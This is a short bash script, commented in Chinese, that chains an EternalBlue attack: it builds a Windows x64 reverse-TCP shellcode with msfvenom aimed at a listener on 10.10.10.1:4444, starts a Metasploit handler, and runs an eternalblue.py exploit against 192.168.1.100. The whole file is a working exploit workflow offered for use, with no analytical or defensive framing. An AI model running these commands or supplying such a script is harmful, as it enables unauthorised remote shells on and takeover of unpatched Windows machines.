#!/bin/bash
# Python 版 EternalBlue 利用脚本

TARGET="192.168.1.100"
LHOST="10.10.10.1"
LPORT="4444"

echo "[*] 第一步：生成 shellcode payload"
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=${LHOST} \
    LPORT=${LPORT} \
    -f raw \
    -o shellcode.bin

echo "[*] 第二步：启动监听"
msfconsole -q -x "
use multi/handler;
set PAYLOAD windows/x64/shell_reverse_tcp;
set LHOST ${LHOST};
set LPORT ${LPORT};
run -j;
" &

echo "[*] 第三步：执行 EternalBlue 漏洞利用"
python3 eternalblue.py ${TARGET} shellcode.bin

echo "[*] 利用完成"
